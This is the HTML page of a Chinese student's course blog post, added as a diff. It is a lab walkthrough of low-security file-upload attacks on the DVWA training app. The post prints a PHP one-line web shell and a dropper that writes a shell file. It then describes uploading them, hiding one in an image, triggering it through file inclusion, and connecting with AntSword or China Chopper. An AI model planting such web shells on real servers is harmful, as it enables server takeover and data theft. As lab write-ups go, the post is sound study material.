@@ -1,0 +1,722 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="在网络安全领域的低安全文件上传场景下，攻击者会采取一系列恶意操作来获取目标服务器的控制权和敏感信息">
+<title>WEB渗透低安全上传</title>
+
+<link rel='canonical' href='https://korriszz.github.io/hugo-dev/p/web%E6%B8%97%E9%80%8F%E4%BD%8E%E5%AE%89%E5%85%A8%E4%B8%8A%E4%BC%A0/'>
+
+<link rel="stylesheet" href="/hugo-dev/scss/style.min.0304c6baf04e01a8fe70693791cb744d56a3578a3120a8796cefc66825aa39c7.css"><meta property='og:title' content="WEB渗透低安全上传">
+<meta property='og:description' content="在网络安全领域的低安全文件上传场景下，攻击者会采取一系列恶意操作来获取目标服务器的控制权和敏感信息">
+<meta property='og:url' content='https://korriszz.github.io/hugo-dev/p/web%E6%B8%97%E9%80%8F%E4%BD%8E%E5%AE%89%E5%85%A8%E4%B8%8A%E4%BC%A0/'>
+<meta property='og:site_name' content='蔡蔡-korriszz'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='学习' /><meta property='article:tag' content='课程' /><meta property='article:tag' content='SXVTC' /><meta property='article:published_time' content='2025-03-11T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-03-11T00:00:00&#43;00:00'/><meta property='og:image' content='https://korriszz.github.io/hugo-dev/p/web%E6%B8%97%E9%80%8F%E4%BD%8E%E5%AE%89%E5%85%A8%E4%B8%8A%E4%BC%A0/head.jpg' />
+<meta name="twitter:title" content="WEB渗透低安全上传">
+<meta name="twitter:description" content="在网络安全领域的低安全文件上传场景下，攻击者会采取一系列恶意操作来获取目标服务器的控制权和敏感信息"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://korriszz.github.io/hugo-dev/p/web%E6%B8%97%E9%80%8F%E4%BD%8E%E5%AE%89%E5%85%A8%E4%B8%8A%E4%BC%A0/head.jpg' />
+    <link rel="shortcut icon" href="/hugo-dev/favicon.ico" />
+<link rel="stylesheet" href="/hugo-dev/css/prism/prism.css">
+<script src="/hugo-dev/js/prism/prism.js"></script>
+<script src="/hugo-dev/js/prism/prism-copy-to-clipboard.js"></script>
+<link rel="stylesheet" href="/hugo-dev/css/custom-prism.css">
+        
+        <link rel="stylesheet" href="/hugo-dev/css/styles.css">
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/hugo-dev/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/hugo-dev/img/muzimi%20%281%29_hu_b430791ee60b1807.gif" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/hugo-dev">蔡蔡-korriszz</a></h1>
+            <h2 class="site-description">欢迎来到我的网站，此博客由【Hugo &#43; Stack】来进行搭建，主要分享个人生活和学习笔记</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://bilibili.com'
+                        target="_blank"
+                        title="BiliBili"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-brand-bilibili"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 10a4 4 0 0 1 4 -4h10a4 4 0 0 1 4 4v6a4 4 0 0 1 -4 4h-10a4 4 0 0 1 -4 -4v-6z" /><path d="M8 3l2 3" /><path d="M16 3l-2 3" /><path d="M9 13v-2" /><path d="M15 11v2" /></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/hugo-dev/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/hugo-dev/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/hugo-dev/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/hugo-dev/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/hugo-dev/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#文件低安全文件上传">文件低安全文件上传</a>
+      <ol>
+        <li><a href="#操作过程">操作过程</a></li>
+      </ol>
+    </li>
+    <li><a href="#图片低安全文件上传">图片低安全文件上传</a></li>
+    <li><a href="#引用">引用</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/hugo-dev/p/web%E6%B8%97%E9%80%8F%E4%BD%8E%E5%AE%89%E5%85%A8%E4%B8%8A%E4%BC%A0/">
+                <img src="/hugo-dev/p/web%E6%B8%97%E9%80%8F%E4%BD%8E%E5%AE%89%E5%85%A8%E4%B8%8A%E4%BC%A0/head_hu_97a5da96f3f244fa.jpg"
+                        srcset="/hugo-dev/p/web%E6%B8%97%E9%80%8F%E4%BD%8E%E5%AE%89%E5%85%A8%E4%B8%8A%E4%BC%A0/head_hu_97a5da96f3f244fa.jpg 800w, /hugo-dev/p/web%E6%B8%97%E9%80%8F%E4%BD%8E%E5%AE%89%E5%85%A8%E4%B8%8A%E4%BC%A0/head_hu_566387cc8b09f3e1.jpg 1600w"
+                        width="800" 
+                        height="800" 
+                        loading="lazy"
+                        alt="Featured image of post WEB渗透低安全上传" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/hugo-dev/categories/web%E6%B8%97%E9%80%8F%E4%BD%8E%E5%AE%89%E5%85%A8/" >
+                WEB渗透低安全
+            </a>
+        
+            <a href="/hugo-dev/categories/web%E6%B8%97%E9%80%8F/" >
+                WEB渗透
+            </a>
+        
+            <a href="/hugo-dev/categories/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E4%B8%8E%E9%98%B2%E6%8A%A4/" >
+                WEB应用安全与防护
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/hugo-dev/p/web%E6%B8%97%E9%80%8F%E4%BD%8E%E5%AE%89%E5%85%A8%E4%B8%8A%E4%BC%A0/">WEB渗透低安全上传</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            在网络安全领域的低安全文件上传场景下，攻击者会采取一系列恶意操作来获取目标服务器的控制权和敏感信息
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2025-03-03</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 2 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="文件低安全上传">文件低安全上传
+</h1><h2 id="文件低安全文件上传">文件低安全文件上传
+</h2><ol>
+<li>木马文件创建
+创建一个包含恶意代码的 PHP 文件作为一句话木马。此代码允许攻击者通过 POST 方式传递指令，在服务器端执行任意 PHP 代码，为后续入侵提供入口。</li>
+<li>网站上传过程
+在 DVWA 网站的低安全设置下，直接上传该木马文件。由于低安全级别对上传文件的验证机制宽松，未严格检查文件类型和内容，木马文件得以成功上传至服务器指定目录。</li>
+<li>提权与后门建立
+利用中国蚁剑工具，通过上传的木马文件获取服务器更高权限。提权成功后，在网站内部创建一个新的后门文件，并按照 “学号 + 姓名.txt” 的格式命名，如 “XX.txt”，方便攻击者后续持续访问和控制服务器，窃取敏感信息或进行其他恶意操作。</li>
+</ol>
+<h3 id="操作过程">操作过程
+</h3><ol>
+<li>第一步：木马文件创建</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-BASH" data-lang="BASH"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl"> eval<span class="o">(</span><span class="nv">$_POSH</span><span class="o">[</span><span class="s2">&#34;123&#34;</span><span class="o">])</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="2">
+<li>第二步：网站上传
+将一句话木马上传网站
+<img src="/hugo-dev/p/web%E6%B8%97%E9%80%8F%E4%BD%8E%E5%AE%89%E5%85%A8%E4%B8%8A%E4%BC%A0/1.png"
+	width="881"
+	height="471"
+	srcset="/hugo-dev/p/web%E6%B8%97%E9%80%8F%E4%BD%8E%E5%AE%89%E5%85%A8%E4%B8%8A%E4%BC%A0/1_hu_7d4ce93e1cbbfd81.png 480w, /hugo-dev/p/web%E6%B8%97%E9%80%8F%E4%BD%8E%E5%AE%89%E5%85%A8%E4%B8%8A%E4%BC%A0/1_hu_852b8b52854a0532.png 1024w"
+	loading="lazy"
+	
+		alt="将一句话木马上传网站"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="187"
+		data-flex-basis="448px"
+	
+>
+复制<code>/··/··/hackable/uploads/a.php</code>
+黏贴至网址<code>#</code>上然后按<kbd>ENTER</kbd></li>
+</ol>
+<p>复制新的网址</p>
+<ol start="3">
+<li>第三步：提权与后门建立
+打开中国<code>蚁🗡</code>或者<code>中国菜鸟</code>
+右键新建将网址和一句话木马密码输入即可连接
+<img src="/hugo-dev/p/web%E6%B8%97%E9%80%8F%E4%BD%8E%E5%AE%89%E5%85%A8%E4%B8%8A%E4%BC%A0/2.png"
+	width="1028"
+	height="688"
+	srcset="/hugo-dev/p/web%E6%B8%97%E9%80%8F%E4%BD%8E%E5%AE%89%E5%85%A8%E4%B8%8A%E4%BC%A0/2_hu_bd7911f8481ff336.png 480w, /hugo-dev/p/web%E6%B8%97%E9%80%8F%E4%BD%8E%E5%AE%89%E5%85%A8%E4%B8%8A%E4%BC%A0/2_hu_6dd2d7639685fcbc.png 1024w"
+	loading="lazy"
+	
+		alt="第三步：提权与后门建立"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="149"
+		data-flex-basis="358px"
+	
+></li>
+</ol>
+<h2 id="图片低安全文件上传">图片低安全文件上传
+</h2><p>安全性：low</p>
+<p>1、制作木马文件php,生成一个叫做23wl3.php的一句话木马文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-BASH" data-lang="BASH"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">fputs<span class="o">(</span>fopen<span class="o">(</span><span class="s2">&#34;426.php&#34;</span>,<span class="s2">&#34;w&#34;</span><span class="o">)</span>,<span class="s1">&#39;&lt;?php eval($_POST[&#34;123&#34;]);空格?&gt;&#39;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">?&gt; 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>2、合成木马图片<BR>
+按 <kbd>WIN</kbd> + <kbd>R</kbd><BR>
+输入cmd<BR>
+3、上传图片<BR>
+上传成功复制<code>/··/··/hackable/uploads/2.jpeg</code><BR>
+4.文件包含生成后门文件<BR>
+点击<code>File Inclusion</code><BR>
+将复制的黏贴到网址的<code>page=</code>后面<BR>
+<img src="/hugo-dev/p/web%E6%B8%97%E9%80%8F%E4%BD%8E%E5%AE%89%E5%85%A8%E4%B8%8A%E4%BC%A0/3.png"
+	width="923"
+	height="525"
+	srcset="/hugo-dev/p/web%E6%B8%97%E9%80%8F%E4%BD%8E%E5%AE%89%E5%85%A8%E4%B8%8A%E4%BC%A0/3_hu_6d6fa01ff1c7ec9e.png 480w, /hugo-dev/p/web%E6%B8%97%E9%80%8F%E4%BD%8E%E5%AE%89%E5%85%A8%E4%B8%8A%E4%BC%A0/3_hu_be9d3266b5bdbbba.png 1024w"
+	loading="lazy"
+	
+		alt="文件包含生成后门文件"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="175"
+		data-flex-basis="421px"
+	
+> <BR>
+5.打开中国<code>蚁🗡</code>或者<code>中国菜鸟</code><BR>
+网址为<code>··/··/··/··/fi/426.php</code>
+右键新建将网址和一句话木马密码输入即可连接<BR>
+<img src="/hugo-dev/p/web%E6%B8%97%E9%80%8F%E4%BD%8E%E5%AE%89%E5%85%A8%E4%B8%8A%E4%BC%A0/2.png"
+	width="1028"
+	height="688"
+	srcset="/hugo-dev/p/web%E6%B8%97%E9%80%8F%E4%BD%8E%E5%AE%89%E5%85%A8%E4%B8%8A%E4%BC%A0/2_hu_bd7911f8481ff336.png 480w, /hugo-dev/p/web%E6%B8%97%E9%80%8F%E4%BD%8E%E5%AE%89%E5%85%A8%E4%B8%8A%E4%BC%A0/2_hu_6dd2d7639685fcbc.png 1024w"
+	loading="lazy"
+	
+		alt="第三步：提权与后门建立"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="149"
+		data-flex-basis="358px"
+	
+></p>
+<h2 id="引用">引用
+</h2><p><a class="link" href="https://baidu.com"  target="_blank" rel="noopener"
+    >参考链接</a></p>
+<blockquote>
+<p>思念是最暖的忧伤像一双翅膀<br>
+让我停不了飞不远在过往游荡<br>
+不告而别的你 就算为了我着想<br>
+这么沉痛的呵护 我怎么能翱翔</p>
+<p><em><a class="link" href="https://www.youtube.com/watch?v=3aypp_YlBzI"  target="_blank" rel="noopener"
+    >最暖的憂傷 - 田馥甄</a></em></p></blockquote>
+
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/hugo-dev/tags/%E5%AD%A6%E4%B9%A0/">学习</a>
+        
+            <a href="/hugo-dev/tags/%E8%AF%BE%E7%A8%8B/">课程</a>
+        
+            <a href="/hugo-dev/tags/sxvtc/">SXVTC</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 示例版权所有者
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/hugo-dev/ts/main.87d72694fb97c84cb5cbf9b1a64d476a38e04a5706618a6ffe5b89c7db00488f.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+<script>
+    
+    const live2d_path = "https://fastly.jsdelivr.net/gh/stevenjoezhang/live2d-widget@latest/";
+    
+    const cssPath = "https://korriszz.github.io/hugo-dev/waifu/waifu.css"
+    const waifuTipsJsonPath = "https://korriszz.github.io/hugo-dev/waifu/waifu-tips.json"
+
+    
+    function loadExternalResource(url, type) {
+        return new Promise((resolve, reject) => {
+            let tag;
+            if (type === "css") {
+                tag = document.createElement("link");
+                tag.rel = "stylesheet";
+                tag.href = url;
+            }
+            else if (type === "js") {
+                tag = document.createElement("script");
+                tag.src = url;
+            }
+            if (tag) {
+                tag.onload = () => resolve(url);
+                tag.onerror = () => reject(url);
+                document.head.appendChild(tag);
+            }
+        });
+    }
+
+    
+    if (screen.width >= 768) {
+        Promise.all([
+            loadExternalResource(cssPath, "css"),
+            loadExternalResource(live2d_path + "live2d.min.js", "js"),
+            loadExternalResource(live2d_path + "waifu-tips.js", "js")
+        ]).then(() => {
+            
+            initWidget({
+                waifuPath: waifuTipsJsonPath,
+                cdnPath: "https://fastly.jsdelivr.net/gh/fghrsh/live2d_api/",
+                tools: ["hitokoto", "asteroids", "switch-model", "switch-texture", "photo", "info", "quit"]
+            });
+        });
+    }
+</script>
+ 
+        
+        <script src="/hugo-dev/js/script.js"></script>
+    </body>
+</html> 
